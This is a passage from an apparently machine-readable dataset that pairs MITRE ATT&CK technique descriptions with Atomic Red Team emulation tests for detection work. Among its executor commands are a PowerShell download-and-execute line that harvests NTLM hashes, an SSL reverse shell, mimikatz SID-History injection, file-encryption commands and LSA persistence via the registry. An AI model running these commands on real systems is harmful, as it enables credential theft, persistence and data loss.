execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.", "atomic_tests": [{"name": "Add command to .bash_profile", "auto_generated_guid": "94500ae1-7e31-47e3-886b-c328da46872f", "description": "Adds a command to the .bash_profile file of the current user\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command_to_add": {"description": "Command to add to the .bash_profile file", "type": "string", "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"}}, "executor": {"command": "echo '#{command_to_add}' >> ~/.bash_profile\n", "cleanup_command": "head -n '-2' ~/.bash_profile > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bash_profile\n", "name": "sh"}}, {"name": "Add command to .bashrc", "auto_generated_guid": "0a898315-4cfa-4007-bafe-33a4646d115f", "description": "Adds a command to the .bashrc file of the current user\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command_to_add": {"description": "Command to add to the .bashrc file", "type": "string", "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"}}, "executor": {"command": "echo '#{command_to_add}' >> ~/.bashrc\n", "cleanup_command": "head -n '-2' ~/.bashrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.bashrc\n", "name": "sh"}}, {"name": "Add command to .shrc", "auto_generated_guid": "41502021-591a-4649-8b6e-83c9192aff53", "description": "Adds a command to the .shrc file of the current user\n", "supported_platforms": ["linux"], "input_arguments": {"command_to_add": {"description": "Command to add to the .shrc file", "type": "string", "default": "echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004"}}, "executor": {"command": "echo '#{command_to_add}' >> ~/.shrc\n", "cleanup_command": "head -n '-2' ~/.shrc > /tmp/T1546.004\nmv /tmp/T1546.004 ~/.shrc\n", "name": "sh"}}, {"name": "Append to the system shell profile", "auto_generated_guid": "694b3cc8-6a78-4d35-9e74-0123d009e94b", "description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n", "supported_platforms": ["linux"], "input_arguments": {"text_to_append": {"description": "Text to append to the /etc/profile file", "type": "string", "default": "# Hello from Atomic Red Team T1546.004"}}, "executor": {"elevation_required": true, "name": "sh", "command": "echo '#{text_to_append}' >> /etc/profile\n", "cleanup_command": "sed -i \"s/# Atomic Red Team was here! T1546.004//\" /etc/profile\n"}}, {"name": "Append commands user shell profile", "auto_generated_guid": "bbdb06bc-bab6-4f5b-8232-ba3fbed51d77", "description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n", "supported_platforms": ["linux"], "input_arguments": {"text_to_append": {"description": "Text to append to the ~/.profile file", "type": "string", "default": "# Atomic Red Team was here... T1546.004"}}, "executor": {"elevation_required": false, "name": "sh", "command": "echo '#{text_to_append}' >> ~/.profile\n", "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" ~/.profile\n"}}, {"name": "System shell profile scripts", "auto_generated_guid": "8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4", "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n", "supported_platforms": ["linux"], "input_arguments": {"text_to_append": {"description": "Text to append to the /etc/profile.d/bash_completion.sh file", "type": "string", "default": "# Atomic Red Team was here... T1546.004"}}, "executor": {"elevation_required": true, "name": "sh", "command": "echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh\n", "cleanup_command": "sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh\n"}}, {"name": "Create/Append to .bash_logout", "auto_generated_guid": "37ad2f24-7c53-4a50-92da-427a4ad13f58", "description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "useradd --create-home --shell /bin/bash art\nsu --login art\necho 'echo \"Atomic Red Team was here... T1546.004\" >> $HOME/art.txt' >> $HOME/.bash_logout\n", "cleanup_command": "userdel -fr art\n"}}]}, "T1187": {"name": "Forced Authentication", "technique_id": "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2", "external_id": "T1187", "data_components": ["Network Traffic Content", "File Access", "Network Traffic Flow", "File Modification", "File Creation"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485"], "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)", "atomic_tests": [{"name": "PetitPotam", "auto_generated_guid": "485ce873-2e65-4706-9c7e-ae3ab9e14213", "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n", "supported_platforms": ["windows"], "input_arguments": {"captureServerIP": {"description": "Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)", "type": "string", "default": "10.0.0.3"}, "targetServerIP": {"description": "Computer IP to force authentication from (ex. domain controller)", "type": "string", "default": "10.0.0.2"}, "efsApi": {"description": "EFS API to use to coerce authentication", "type": "integer", "default": 1}, "petitpotam_path": {"description": "PetitPotam Windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n", "prereq_command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true\" -OutFile \"#{petitpotam_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n"}}, {"name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS", "auto_generated_guid": "7f06b25c-799e-40f1-89db-999c9cc84317", "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"", "name": "powershell"}}]}, "T1134.005": {"name": "SID-History Injection", "technique_id": "attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023", "external_id": "T1134.005", "data_components": ["OS API Execution", "Active Directory Object Modification", "User Account Metadata"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).", "atomic_tests": [{"name": "Injection SID-History with mimikatz", "auto_generated_guid": "6bef32e5-9456-4072-8f14-35566fb85401", "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n", "supported_platforms": ["windows"], "input_arguments": {"sid_to_inject": {"description": "SID to inject into sidhistory", "type": "string", "default": "S-1-5-21-1004336348-1177238915-682003330-1134"}, "sam_account_name": {"description": "Target account to modify", "type": "string", "default": "$env:username"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "#{mimikatz_path} \"privilege::debug\" \"sid::patch\" \"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\" \"exit\"\n", "cleanup_command": "#{mimikatz_path} \"sid::clear /sam:#{sam_account_name}\" \"exit\"\n"}}]}, "T1486": {"name": "Data Encrypted for Impact", "technique_id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0", "external_id": "T1486", "data_components": ["File Modification", "Network Share Access", "Process Creation", "Command Execution", "File Creation", "Cloud Storage Modification"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": ["course-of-action--3efe43d1-6f3f-4fcb-ab39-4a730971f70b", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)", "atomic_tests": [{"name": "Encrypt files using gpg (FreeBSD/Linux)", "auto_generated_guid": "7b8ce084-3922-4618-8d22-95f996173765", "description": "Uses gpg to encrypt a file\n", "supported_platforms": ["linux"], "input_arguments": {"pwd_for_encrypted_file": {"description": "the password that you want for the encrypted file", "type": "string", "default": "passwd"}, "encrypted_file_path": {"description": "path to the encrypted file", "type": "path", "default": "/tmp/passwd.gpg"}, "input_file_path": {"description": "path to the file that you want to encrypt", "type": "path", "default": "/etc/passwd"}, "encryption_alg": {"description": "encryption algorithm of the file", "type": "string", "default": "AES-256"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Finds where gpg is located\n", "prereq_command": "which_gpg=`which gpg`\n", "get_prereq_command": "(which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n", "cleanup_command": "rm #{encrypted_file_path}\n"}}, {"name": "Encrypt files using 7z (FreeBSD/Linux)", "auto_generated_guid": "53e6735a-4727-44cc-b35b-237682a151ad", "description": "Uses 7z to encrypt a file\n", "supported_platforms": ["linux"], "input_arguments": {"pwd_for_encrypted_file": {"description": "the password that you want for the encrypted file", "type": "string", "default": "passwd"}, "encrypted_file_path": {"description": "path to the encrypted file", "type": "path", "default": "/tmp/passwd.zip"}, "input_file_path": {"description": "path to the file that you want to encrypt", "type": "path", "default": "/etc/passwd"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Finds where 7z is located\n", "prereq_command": "which_7z=`which 7z`\n", "get_prereq_command": "(which pkg && pkg install -y 7-zip)\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n", "cleanup_command": "$which_7z e #{encrypted_file_path}\nrm #{encrypted_file_path}\n"}}, {"name": "Encrypt files using ccrypt (FreeBSD/Linux)", "auto_generated_guid": "08cbf59f-85da-4369-a5f4-049cffd7709f", "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n", "supported_platforms": ["linux"], "input_arguments": {"cped_file_path": {"description": "path where you want your copied file to be", "type": "path", "default": "/tmp/passwd"}, "root_input_file_path": {"description": "path to the file that you want to be encrypted if you are root user", "type": "path", "default": "/etc/passwd"}, "user_input_file_path": {"description": "path to file that you want to be encrypted if you are normal user", "type": "path", "default": "~/.bash_history"}, "impact_command": {"description": "command to show impact of encryption", "type": "string", "default": "sudo su"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Finds where ccencrypt and ccdecrypt is located and copies input file\n", "prereq_command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\nif [ $USER == \"root\" ]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi\n", "get_prereq_command": "(which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "if [ $USER == \"root\" ]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n", "cleanup_command": "if [ $USER == \"root\" ]; then mv #{cped_file_path} #{root_input_file_path}; else cp #{cped_file_path} #{user_input_file_path}; fi \n"}}, {"name": "Encrypt files using openssl (FreeBSD/Linux)", "auto_generated_guid": "142752dc-ca71-443b-9359-cf6f497315f1", "description": "Uses openssl to encrypt a file\n", "supported_platforms": ["linux"], "input_arguments": {"private_key_path": {"description": "path to the private key", "type": "path", "default": "/tmp/key.pem"}, "public_key_path": {"description": "path to the public key", "type": "path", "default": "/tmp/pub.pem"}, "encryption_bit_size": {"description": "size of the bit of encryption", "type": "integer", "default": 2048}, "encrypted_file_path": {"description": "path to the encrypted file", "type": "path", "default": "/tmp/passwd.zip"}, "input_file_path": {"description": "path to the file that you want to encrypt", "type": "path", "default": "/etc/passwd"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "Finds where openssl is located\n", "prereq_command": "which_openssl=`which openssl`\n", "get_prereq_command": ""}], "executor": {"name": "sh", "elevation_required": false, "command": "$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n", "cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n"}}, {"name": "PureLocker Ransom Note", "auto_generated_guid": "649349c7-9abf-493b-a7a2-b1aa4d141528", "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n", "cleanup_command": "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n"}}, {"name": "Encrypt files using 7z utility - macOS", "auto_generated_guid": "645f0f5a-ef09-48d8-b9bc-f0e24c642d72", "description": "This test encrypts the file(s) using the 7z utility\n", "supported_platforms": ["macos"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if 7z command exists on the machine\n", "prereq_command": "which 7z\n", "get_prereq_command": "echo Installing 7z, using brew\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\nbrew install p7zip\n"}], "input_arguments": {"file_password": {"description": "Password to be provided for archiving the file", "type": "string", "default": "ARTPass"}, "encrypted_file_name": {"description": "Name of the archive to be created", "type": "string", "default": "ARTArchive.7z"}, "input_file_path": {"description": "Path to the file that you want to encrypt", "type": "path", "default": "~/test.txt"}}, "executor": {"command": "7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}\n", "cleanup_command": "rm #{encrypted_file_name}\n", "name": "sh", "elevation_required": false}}, {"name": "Encrypt files using openssl utility - macOS", "auto_generated_guid": "1a01f6b8-b1e8-418e-bbe3-78a6f822759e", "description": "This test encrypts the file(s) using the openssl utility\n", "supported_platforms": ["macos"], "input_arguments": {"encryption_option": {"description": "Specifiy the required encryption option", "type": "string", "default": "-pbkdf2"}, "input_file_path": {"description": "Path to the file that you want to encrypt", "type": "path", "default": "~/test.txt"}, "output_file_name": {"description": "Path to the file that you want to encrypt", "type": "string", "default": "ARTFile"}}, "executor": {"command": "openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}\n", "cleanup_command": "rm #{output_file_name}\n", "name": "sh", "elevation_required": false}}, {"name": "Data Encrypted with GPG4Win", "auto_generated_guid": "4541e2c2-33c8-44b1-be79-9161440f1718", "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.", "supported_platforms": ["windows"], "input_arguments": {"GPG_Exe_Location": {"description": "Path of the GPG program", "type": "path", "default": "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe"}, "File_to_Encrypt_Location": {"description": "Path of File", "type": "path", "default": "$env:temp\\test.txt"}}, "dependencies": [{"description": "GPG must exist at (#{GPG_Exe_Location})\n", "prereq_command": "if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "cmd /c '#{GPG_Exe_Location}' -c '#{File_to_Encrypt_Location}'\n", "cleanup_command": "remove-item '#{File_to_Encrypt_Location}.gpg' -force -erroraction silentlycontinue | out-null\n"}}]}, "T1573": {"name": "Encrypted Channel", "technique_id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118", "external_id": "T1573", "data_components": ["Network Traffic Content"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--7bb5fae9-53ad-4424-866b-f0ea2a8b731d"], "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "atomic_tests": [{"name": "OpenSSL C2", "auto_generated_guid": "21caf58e-87ad-440c-a6b8-3ac259964003", "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n", "supported_platforms": ["windows"], "input_arguments": {"server_ip": {"description": "IP of the external server", "type": "string", "default": "127.0.0.1"}, "server_port": {"description": "The port to connect to on the external server", "type": "string", "default": "443"}}, "executor": {"command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", "name": "powershell"}}]}, "T1547.002": {"name": "Authentication Package", "technique_id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec", "external_id": "T1547.002", "data_components": ["Windows Registry Key Modification", "Module Load", "Command Execution"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1"], "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.", "atomic_tests": [{"name": "Authentication Package", "auto_generated_guid": "be2590e8-4ac3-47ac-b4b5-945820f2fbe9", "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n", "supported_platforms": ["windows"], "executor": {"command": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n", "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f\nrm -force C:\\windows\\system32\\package.dll\n", "name": "powershell", "elevation_required": true}}]}, "T1218.010": {"name": "Regsvr32", "technique_id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab", "external_id": "T1218.010", "data_components": ["Process Creation", "Module Load", "Command Execution", "Network Connection Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--d2a24649-9694-4c97-9c62-ce7b270bf6a3"], "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)", "atomic_tests": [{"name": "Regsvr32 local COM scriptlet execution", "auto_generated_guid": "449aa403-6aba-47ce-8a37-247d21ef0306", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Name of the local file, include path.", "type": "path", "default": "PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct"}, "regsvr32path": {"description": "Default location of Regsvr32.exe", "type": "path", "default": "C:\\Windows\\system32"}, "regsvr32name": {"description": "Default name of Regsvr32.exe", "type": "string", "default": "regsvr32.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Regsvr32.sct must exist on disk 